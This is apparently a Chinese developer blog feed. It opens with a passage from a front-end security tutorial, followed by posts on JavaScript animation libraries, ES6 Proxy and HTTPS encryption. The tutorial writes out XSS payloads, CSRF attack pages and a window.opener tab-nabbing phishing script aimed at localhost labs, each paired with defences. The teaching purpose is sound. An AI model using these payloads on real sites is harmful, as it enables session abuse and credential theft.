$username=&quot;\u003cimg src=\&apos;\&apos; onerror=javascript:alert(\&apos;okok\&apos;);\u003e&quot;;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; document.getElementById(&apos;username_info&apos;).innerHTML = &quot;&lt;?php echo htmlentities($username);?&gt;&quot;; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 这样，innerHTML也可以派上用场，再次突破防线。 升级防御看来，我们需要再次进行防御升级了，我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了。代码如下： 1document.getElementById(&apos;username_info&apos;).innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;; 生成处的源码，如图1.4.1 效果如图1.4.2所示 XSS再升级都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下： 1234567891011121314151617181920212223242526&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=&quot;username_info&quot;&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; var param = /=(.+)$/.exec(location.search); var value = decodeURIComponent(param[1]); $(&apos;#username_info&apos;).append(value); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行(如图1.5.1所示)。 防御再次升级像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图1.6.1 1234&lt;script&gt; var value = decodeURIComponent(&quot;&lt;?php echo htmlentities($_GET[&apos;username&apos;]);?&gt;&quot;); $(&apos;#username_info&apos;).append(value);&lt;/script&gt; 使用url中的参数的时候要小心，更不要拿URL中的参数去eval。 保护好你的cookie如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下： 123&lt;?php setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);?&gt; 如图1.7.1，我们的cookie已经种上了，并且有了httpOnly标识 如图1.7.2，我们通过js无法获取cookie中的设定有httpOnly的字段： 话说回来，其实还有很多xss的升级攻击方式，同学们有兴趣的话，可以自己去研究一下。(不要干坏事儿哦) CSRF攻击CSRF攻击在百度百科中的解释是：CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。 如何攻击？要合理使用post与get通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。 比如，你开发的网站中，有一个购买商品的操作。你是这么开发的： 1234567891011&lt;?php// 从cookie中获取用户名，看似稳妥$username = $_COOKIE[&apos;username&apos;];$productId = $_GET[&apos;pid&apos;];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;?phpecho $username . &apos;买入商品：&apos; . $productId;?&gt; 而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图2.2.1.1所示 那么，黑客的网站可以这样开发： 123456789&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; /&gt; &lt;/body&gt;&lt;/html&gt; 所以，我们日常的开发，还是要遵循提交业务，严格按照post请求去做的。更不要使用jsonp去做提交型的接口，这样非常的危险。 xsrf攻击升级如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下： 1234567891011&lt;?php$username = $_COOKIE[&apos;username&apos;];// 换为post了，可以规避黑客直接的提交$productId = $_POST[&apos;pid&apos;];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;?phpecho $username . &apos;买入商品：&apos; . $productId;?&gt; 黑客代码如下： 1234567891011121314151617181920&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=&quot;clickme&quot;&gt;点我看相册&lt;/button&gt; &lt;script&gt; $(&apos;#clickme&apos;).on(&apos;click&apos;, function () &#123; // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。 $(&apos;#myform&apos;).submit(); &#125;); &lt;/script&gt; &lt;form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;&gt; &lt;/form&gt; &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过。代码如下，防御效果如图2.2.2.2 12345678910111213141516171819202122&lt;?php$username = $_COOKIE[&apos;username&apos;];$productId = $_POST[&apos;pid&apos;];$token=$_POST[&apos;token&apos;];// 校验算法例子function check_token($token) &#123; if ($token===&apos;doctorhou-shuai&apos;) &#123; return true; &#125; return false;&#125;if (!check_token($token)) &#123; // 如果校验未通过，则中止 return ;&#125;// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;?phpecho $username . &apos;买入商品：&apos; . $productId;?&gt; 如上图，并没有携带本站每次session生成的token，则提交失败。本站的网站form，则都会自动携带本站生成的token 12345678910111213141516171819&lt;?php function token_creater() &#123; // 本站生成token的方法 return &apos;doctorhou-shuai&apos;;&#125;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form id=&quot;myform&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://localhost:8082/lab/xsrflab/submit.php&quot;&gt; 商品名称：&lt;input name=&quot;pid&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;?php echo token_creater();?&gt;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 再次使用本站的网页进行提交，则通过，如图2.2.2.3所示： 当然，上面的只是例子，具体的token生成，肯定是要随着session与用户ID去变的，如果各位看官觉得自己的网站也需要加个token，请自行百度，进行深入的学习。 网络劫持攻击很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。 如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密–即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。 控制台注入代码不知道各位看官有没有注意到天猫官网控制台的警告信息，如图4.1所示，这是为什么呢？因为有的黑客会诱骗用户去往控制台里面粘贴东西（欺负小白用户不懂代码），比如可以在朋友圈贴个什么文章，说:”只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品”之类的，那么有的用户真的会去操作，并且自己隐私被暴露了也不知道。 天猫这种做法，也是在警告用户不要这么做，看来天猫的前端安全做的也是很到位的。不过，这种攻击毕竟是少数，所以各位看官看一眼就行，如果真的发现有的用户会被这样攻击的话，记得想起天猫的这种解决方案。 钓鱼钓鱼也是一种非常古老的攻击方式了，其实并不太算前端攻击。可毕竟是页面级别的攻击，我们也来一起聊一聊。我相信很多人会有这样的经历，QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。1、首先，我们在xx空间里分享一篇文章，然后吸引别人去点击。效果如图5.1.1 1234567891011121314151617&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 当前你在xx空间 &lt;/div&gt; &lt;h1&gt;侯博士的分享&lt;/h1&gt; &lt;section&gt; 咱们班当年班花，现在长这样： &lt;!--这是咱们的钓鱼网站--&gt; &lt;a href=&quot;http://localhost:8082/lab/fish/cheat.php&quot; target=&quot;_blank&quot;&gt;点我查看&lt;/a&gt; &lt;/section&gt; &lt;/body&gt;&lt;/html&gt; 2、接着，我们在cheat.php这个网站上面，将跳转过来的源网页地址悄悄的进行修改。效果如图5.2.1 12345678910111213141516&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; 你想看的信息： xxxxxxxxxxxxxx xxxxxxxxxxxxxx &lt;script&gt; // 在用户不知情的情况下，对跳转的来源网页进行地址替换 window.opener.location = &apos;http://localhost:8082/lab/fish/myfishsite.php&apos;; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。 3、我们的钓鱼网站，伪装成XX空间，让用户输入用户名与密码，如图5.3.1 这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。 我们平时开发要注意些什么？ 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测 要注意对用户的输出内容进行过滤(进行转义等) 重要的内容记得要加密传输(无论是利用https也好，自己加密也好) get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。 对于URL上携带的信息，要谨慎使用。 心中时刻记着，自己的网站哪里可能有危险。 毕竟web安全是个很大的面，如果需要了解，还是需要进行专门的学习的。希望这篇聊一聊，可以让各位开发者的网站变得更安全。]]></content>
      <categories>
        <category>WEB前端</category>
      </categories>
      <tags>
        <tag>WEB前端</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几种 JavaScript 动画库推荐]]></title>
    <url>%2F2018%2F01%2F14%2F%E5%B8%B8%E8%A7%81js%E5%8A%A8%E7%94%BB%E5%BA%93%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[转载：Aceyclee:https://zhuanlan.zhihu.com/p/28645609 简评：JavaScript 库对设计师和开发人员来说，都是非常有用的工具。它们可以为你的网站添加一些超级强大的功能，给用户带来更好的体验。 1.AniJS.js基于 CSS3 的动画库 2.Velocity.jsVelocity 是一个简单易用、高性能、功能丰富的轻量级 JS 动画库。它能和 jQuery 完美协作，并和 $.animate() 有相同的 API， 但它不依赖 jQuery，可单独使用 3.vivus.jsVivus 是一款可以执行 SVG 路径动画的轻量级 Javascript 库 4.snabbt.jssnabbt.js 是一款轻量级的、功能强大的、简单易用的 jQuery 动画库插件查看 demo： CardsCrazy sticksPeriodic tableLaser words 5.PACE.js网页自动加载进度条插件 6.Popmotion.jsPopmotion 是一个只有 12KB 的 JavaScript 运动引擎，可以用来实现动画，物理效果和输入跟踪 7.Bounce.jsBounce.js 是一个漂亮的关键帧动画生成工具和类库，基于 CSS3 实现 8.Dynamics.jsDynamics.js 是一款可以创建物理运动动画效果的 js 库插件 9.mo.js挺有趣的一个动画的图形库 mo.js，页面效果真是酷炫 10.cta.js一款轻量级 Modal 模态框插件 11.Rocket 12.html5tooltips.jshtml5tooltips.js 是一个轻量级和简洁的 Tooltips。采用纯 JavaScript 开发，拥有 CSS 动画，不依赖任何框架 13.ScrollReveal.jsScrollReveal.js 用于创建和管理元素进入可视区域时的动画效果，帮助你的网站增加吸引力 14.WOW.jsWOW.js 是一款帮助你实现滚动页面时触发 CSS 动画效果的插件 15.Transit 16.parallax.jsParallax.js 是一款功能非常强大的 JavaScript 视觉差特效引擎插件。通过这个视觉差插件可以制作出非常炫酷的视觉差特效，可以检测智能设备的方向。 17.CreateJSCreateJS 库是一款 HTML5 游戏开发的引擎，是一套可以构建丰富交互体验的 HTML5 游戏的开源工具包 工欲善其事，必先利其器，好好利用它们！]]></content>
      <categories>
        <category>Animation</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Animation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6中的代理Proxy]]></title>
    <url>%2F2018%2F01%2F05%2FProxy%2F</url>
    <content type="text"><![CDATA[给大家推荐一篇文章：http://www.infoq.com/cn/articles/es6-in-depth-proxies-and-reflect 术语 术语名称 handler 包含陷阱（traps）的占位符对象。 traps 提供属性访问的方法。这类似于操作系统中陷阱的概念。 target 代理虚拟化的对象。它通常用作代理的存储后端。根据目标验证关于对象不可扩展性或不可配置属性的不变量（保持不变的语义）。 语法1let p = new Proxy(target, handler); 参数 参数 target 用Proxy包装的目标对象（可以是任何类型的对象，包括原生数组，函数，甚至另一个代理） handler 一个对象，其属性是当执行一个操作时定义代理的行为的函数。 方法Proxy.revocable():创建一个可撤销的Proxy对象。 handler 对象的方法handler 对象是一个占位符对象，它包含Proxy的陷阱。一共有 13 种可代理操作，每种操作的代号（属性名/方法名）和触发这种操作的方式列举如下。注意，如果没有定义某种操作，那么这种操作会被转发到目标对象身上。 方法名称 handler.getPrototypeOf() 在读取代理对象的原型时触发该操作，比如在执行 Object.getPrototypeOf(proxy) 时。 handler.setPrototypeOf() 在设置代理对象的原型时触发该操作，比如在执行 Object.setPrototypeOf(proxy, null) 时。 handler.isExtensible() 在判断一个代理对象是否是可扩展时触发该操作，比如在执行 Object.isExtensible(proxy) 时 handler.preventExtensions() 在让一个代理对象不可扩展时触发该操作，比如在执行 Object.preventExtensions(proxy) 时 handler.getOwnPropertyDescriptor() 在获取代理对象某个属性的属性描述时触发该操作，比如在执行 Object.getOwnPropertyDescriptor(proxy, “foo”) 时 handler.defineProperty() 在定义代理对象某个属性时的属性描述时触发该操作，比如在执行 Object.defineProperty(proxy, “foo”, {}) 时 handler.has() 在判断代理对象是否拥有某个属性时触发该操作，比如在执行 “foo” in proxy 时 handler.get() 在读取代理对象的某个属性时触发该操作，比如在执行 proxy.foo 时 handler.set() 在给代理对象的某个属性赋值时触发该操作，比如在执行 proxy.foo = 1 时 handler.deleteProperty() 在删除代理对象的某个属性时触发该操作，比如在执行 delete proxy.foo 时 handler.ownKeys() 在获取代理对象的所有属性键时触发该操作，比如在执行 Object.getOwnPropertyNames(proxy) 时 handler.apply() 在调用一个目标对象为函数的代理对象时触发该操作，比如在执行 proxy() 时 handler.construct() 在给一个目标对象为构造函数的代理对象构造实例时触发该操作，比如在执行new proxy() 时 示例基础示例在以下简单的例子中，当对象中不存在属性名时，缺省返回数为37。例子中使用了 get。 1234567891011121314let handler = &#123; get: function(target, name)&#123; return name in target ? target[name] : 37; &#125;&#125;;let p = new Proxy(&#123;&#125;, handler);p.a = 1;p.b = undefined;console.log(p.a, p.b); // 1, undefinedconsole.log('c' in p, p.c); // false, 37 无操作转发代理在以下例子中，我们使用了一个原生 JavaScript 对象，代理会将所有应用到它的操作转发到这个对象上。 123456let target = &#123;&#125;;let p = new Proxy(target, &#123;&#125;);p.a = 37; // 操作转发到目标console.log(target.a); // 37. 操作已经被正确地转发 验证通过代理，你可以轻松地验证向一个对象的传值。这个例子使用了 set。 12345678910111213141516171819202122232425262728let validator = &#123; set: function(obj, prop, value) &#123; if (prop === 'age') &#123; if (!Number.isInteger(value)) &#123; throw new TypeError('The age is not an integer'); &#125; if (value &gt; 200) &#123; throw new RangeError('The age seems invalid'); &#125; &#125; // The default behavior to store the value obj[prop] = value; &#125;&#125;;let person = new Proxy(&#123;&#125;, validator);person.age = 100;console.log(person.age); // 100person.age = 'young'; // 抛出异常: Uncaught TypeError: The age is not an integerperson.age = 300; // 抛出异常: Uncaught RangeError: The age seems invalid 扩展构造函数方法代理可以轻松地通过一个新构造函数来扩展一个已有的构造函数。这个例子使用了construct和apply。 123456789101112131415161718192021222324252627282930313233343536function extend(sup,base) &#123; var descriptor = Object.getOwnPropertyDescriptor( base.prototype,"constructor" ); base.prototype = Object.create(sup.prototype); var handler = &#123; construct: function(target, args) &#123; var obj = Object.create(base.prototype); this.apply(target,obj,args); return obj; &#125;, apply: function(target, that, args) &#123; sup.apply(that,args); base.apply(that,args); &#125; &#125;; var proxy = new Proxy(base,handler); descriptor.value = proxy; Object.defineProperty(base.prototype, "constructor", descriptor); return proxy;&#125;var Person = function(name)&#123; this.name = name&#125;;var Boy = extend(Person, function(name, age) &#123; this.age = age;&#125;);Boy.prototype.sex = "M";var Peter = new Boy("Peter", 13);console.log(Peter.sex); // "M"console.log(Peter.name); // "Peter"console.log(Peter.age); // 13 操作 DOM 节点有时你希望切换两个不同的元素的属性或类名。下面展示了如何使用 set。 123456789101112131415161718192021222324252627let view = new Proxy(&#123; selected: null&#125;,&#123; set: function(obj, prop, newval) &#123; let oldval = obj[prop]; if (prop === 'selected') &#123; if (oldval) &#123; oldval.setAttribute('aria-selected', 'false'); &#125; if (newval) &#123; newval.setAttribute('aria-selected', 'true'); &#125; &#125; // The default behavior to store the value obj[prop] = newval; &#125;&#125;);let i1 = view.selected = document.getElementById('item-1');console.log(i1.getAttribute('aria-selected')); // 'true'let i2 = view.selected = document.getElementById('item-2');console.log(i1.getAttribute('aria-selected')); // 'false'console.log(i2.getAttribute('aria-selected')); // 'true' 值修正及附加属性以下products代理会计算传值并根据需要转换为数组。这个代理对象同时支持一个叫做 latestBrowser的附加属性，这个属性可以同时作为 getter 和 setter。 12345678910111213141516171819202122232425262728293031323334353637let products = new Proxy(&#123; browsers: ['Internet Explorer', 'Netscape']&#125;,&#123; get: function(obj, prop) &#123; // 附加属性 if (prop === 'latestBrowser') &#123; return obj.browsers[obj.browsers.length - 1]; &#125; // 缺省行为是返回属性值 return obj[prop]; &#125;, set: function(obj, prop, value) &#123; // 附加属性 if (prop === 'latestBrowser') &#123; obj.browsers.push(value); return; &#125; // 如果不是数组则进行转换 if (typeof value === 'string') &#123; value = [value]; &#125; // 缺省行为是保存属性值 obj[prop] = value; &#125;&#125;);console.log(products.browsers); // ['Internet Explorer', 'Netscape']products.browsers = 'Firefox'; // ?传入一个 string (错误地)console.log(products.browsers); // ['Firefox'] &lt;- ?没问题, ?得到的是一个 arrayproducts.latestBrowser = 'Chrome';console.log(products.browsers); // ['Firefox', 'Chrome']console.log(products.latestBrowser); // 'Chrome' 通过属性查找数组中的特定对象以下代理为数组扩展了一些实用工具。可以看到，你可以灵活地“定义”属性，而不需要使用 Object.defineProperties方法。以下例子可以用于通过单元格来查找表格中的一行。在这种情况下，target 是table.rows。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455let products = new Proxy([ &#123; name: 'Firefox', type: 'browser' &#125;, &#123; name: 'SeaMonkey', type: 'browser' &#125;, &#123; name: 'Thunderbird', type: 'mailer' &#125;],&#123; get: function(obj, prop) &#123; // 缺省行为是返回属性值， prop ?通常是一个整数 if (prop in obj) &#123; return obj[prop]; &#125; // 获取 products 的 number; 它是 products.length 的别名 if (prop === 'number') &#123; return obj.length; &#125; let result, types = &#123;&#125;; for (let product of obj) &#123; if (product.name === prop) &#123; result = product; &#125; if (types[product.type]) &#123; types[product.type].push(product); &#125; else &#123; types[product.type] = [product]; &#125; &#125; // 通过 name 获取 product if (result) &#123; return result; &#125; // 通过 type 获取 products if (prop in types) &#123; return types[prop]; &#125; // 获取 product type if (prop === 'types') &#123; return Object.keys(types); &#125; return undefined; &#125;&#125;);console.log(products[0]); // &#123; name: 'Firefox', type: 'browser' &#125;console.log(products['Firefox']); // &#123; name: 'Firefox', type: 'browser' &#125;console.log(products['Chrome']); // undefinedconsole.log(products.browser); // [&#123; name: 'Firefox', type: 'browser' &#125;, &#123; name: 'SeaMonkey', type: 'browser' &#125;]console.log(products.types); // ['browser', 'mailer']console.log(products.number); // 3 一个完整的 traps 列表示例出于教学目的，这里为了创建一个完整的 traps 列表示例，我们将尝试代理化一个非原生对象，这特别适用于这类操作：由 发布在 document.cookie页面上的“小型框架”创建的docCookies全局对象。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* var docCookies = ... get the "docCookies" object here: https://developer.mozilla.org/zh-CN/docs/DOM/document.cookie#A_little_framework.3A_a_complete_cookies_reader.2Fwriter_with_full_unicode_support*/var docCookies = new Proxy(docCookies, &#123; "get": function (oTarget, sKey) &#123; return oTarget[sKey] || oTarget.getItem(sKey) || undefined; &#125;, "set": function (oTarget, sKey, vValue) &#123; if (sKey in oTarget) &#123; return false; &#125; return oTarget.setItem(sKey, vValue); &#125;, "deleteProperty": function (oTarget, sKey) &#123; if (sKey in oTarget) &#123; return false; &#125; return oTarget.removeItem(sKey); &#125;, "enumerate": function (oTarget, sKey) &#123; return oTarget.keys(); &#125;, "ownKeys": function (oTarget, sKey) &#123; return oTarget.keys(); &#125;, "has": function (oTarget, sKey) &#123; return sKey in oTarget || oTarget.hasItem(sKey); &#125;, "defineProperty": function (oTarget, sKey, oDesc) &#123; if (oDesc &amp;&amp; "value" in oDesc) &#123; oTarget.setItem(sKey, oDesc.value); &#125; return oTarget; &#125;, "getOwnPropertyDescriptor": function (oTarget, sKey) &#123; var vValue = oTarget.getItem(sKey); return vValue ? &#123; "value": vValue, "writable": true, "enumerable": true, "configurable": false &#125; : undefined; &#125;,&#125;);/* Cookies 测试 */alert(docCookies.my_cookie1 = "First value");alert(docCookies.getItem("my_cookie1"));docCookies.setItem("my_cookie1", "Changed value");alert(docCookies.my_cookie1);]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP协议族(三) 数字签名与HTTPS详解]]></title>
    <url>%2F2018%2F01%2F05%2FTCP%3AIP%E5%8D%8F%E8%AE%AE%E6%97%8F(%E4%B8%89)%20%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%B8%8EHTTPS%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[转载：http://www.cnblogs.com/ludashi/p/6237715.html 前面几篇博客聊了HTTP的相关东西，今天就来聊一聊HTTPS的东西。因为HTTP协议本身存在着明文传输、不能很好的验证通信方的身份和无法验证报文的完整性等一些安全方面的确点，所以才有了HTTPS的缺陷。HTTPS确切的的说不是一种协议，而是HTTP + SSL (TSL)的结合体。HTTP报文经过SSL层加密后交付给TCP层进行传输。SSL(安全套节层)主要采取的是RSA（非对称加密）与AES（对称加密）结合的加密方式。先通过RSA交互AES的密钥，然后通过AES进行报文加密和解密。本篇博客主要聊的就是HTTPS具体的工作过程。 RSA与AES简述在本篇博客的第一部分呢，先聊一下RAS与AES这两个加密策略，如果你在公司做过支付相关的东西，对数据传输的安全性要求比较高，这时候就得采取一些加密措施将传输的报文进行加密，必要时再进行MD5验签。当然本部分聊的RAS与AES是比较简洁的，关于这两者具体的内容，请自行Google吧。因为HTTPS在传输的过程中使用到了RSA与AES加密算法，所以在聊HTTP+SSL之前呢，我们先简单的聊一下AES与RSA。 Advanced Encryption Standard （AES: 高级加密标准）AES，全称：Advanced Encryption Standard—-高级加密标准。该加密算法有一个密钥，该密钥可以用来加密，也可以用来解密，所以AES是对称加密算法。下方这个就是AES加密和解密的过程。Client端与Server端有一个共同的Key, 这个Key是用来加密和解密的。如果报文在传输的过程中被窃取了，没有这个key, 对加密的内容进行破解是非常困难的，当然窃取者如果有key的话，也是可以轻而易举的解密的。所以在AES中，key是关键。这也就相当于你们家的门钥匙，谁拿到钥匙后都可以打开你们家的门。即使门锁再结实，再安全，在钥匙面前也是不行呢。 所以对于AES加密策略来说这个Key的保密措施要做足一些，如果之后有时间的话可以分享一些具体的AES加密策略。比如每次加密的Key都是从一个密码本中动态生成的，而这个密码本服务端和客户端都有同一本，每次传输的是一些参数。这些参数在经过一些算法的映射，从密码本中取出相应的key用来解密。这样一来，就相当于给AES加了一层防盗门，加大了破解的难度。这样做的好处是每次加密的key都是不同的，而且需要密码本以及映射算法的支持。 RSA 公钥加密算法RAS这个名字，就是该算法三位发明者的名字的首字母的组合。RAS是非对称加密，其在加密和解密的过程中，需要两个Key，一个公钥（public key），一个是私钥（private key）。公钥负责加密，而私钥负责解密。从名字就可以看出，公钥是可以开放出去的，任何人都可以持有公钥进行加密。而私钥必须得进行保护，因为是用来解密的。 这样一来，加密和解密就可以用不同的钥匙来处理。对于加密放来说，即使你可以对报文进行加密，如果没有私有的话也是不可以对你加密的内容进行解密的。这就相当于一个盒子，盒子上有把锁。你可以把东西放进去，然后再锁上盒子。但是如果你没有钥匙的话，也是打不开这把锁的。 下方这个简图就是服务端单向验证的RAS非对称加密算法，Client内置了一个公钥，该公钥与Server端的私钥是配对的，所以Client端可以使用这个内置的Public key加密，而服务端就可以使用这个private key进行解密。目前最常用的是服务端单向认证机制。 CA证书如果你自己通过RAS算法生成了一个私钥和公钥，在公钥发送给客户端的过程中有可能被篡改成其他的公钥，而客户端在没有其他措施的保护下是不知道该公钥是否就是服务器那边的私钥对应的公钥的。这种自己做的RAS的公钥和私钥有可能在公钥分发的过程中被篡改。下方就是Client从Server端获取公钥时被中间者篡改了，将public换成了自己的伪public key, 同样这个中间者持有这个伪public key所对应的伪private key。如果客户端使用的伪public key进行加密传输的话，那么中间者是可以使用自己的private key进行解密的。 举个例子来类比一下这个问题。 假设你在古代，你出门在外，妻子在家养子。你们家有个箱子，箱子上有把锁，这就是你和你妻子互通的工具。你媳妇儿负责往箱子里放东西，然后上锁。你有把独特的钥匙，你负责开锁，取东西。可是你再将箱子给镖局托运的的过程中，被镖局的“小黑”掉包了，箱子的外表一致，锁看起来也一样，可是已经不是你的箱子了。因为路途遥远，古代又没有什么iPhone啥的，你媳妇没办法来辨别该箱子是否是原装的。然后就将一些东西放在了箱子里边，然后上锁交给了镖局的“小黑”。 因为“小黑”掉包的箱子，所以小黑有箱子的钥匙呢，然后就可以打开这个箱子，取东西了。原来的箱子又在小黑那，小黑就可以往原来的箱子里边随便往箱子放点没有价值的东西给你就行了。当你发现箱子里的东西不是你想要的时候，完了，小黑从镖局辞职了，找不到人了。找镖局的人讨说法，可是镖局的人说“小黑”是镖局的临时工，这个责任镖局说了，我们不能担。鉴于你无权无势，这事儿也就此罢了。（故事纯属虚构，如有雷同纯属巧合） 关于更多骗子的故事请移步网络剧《毛骗》一二三季。 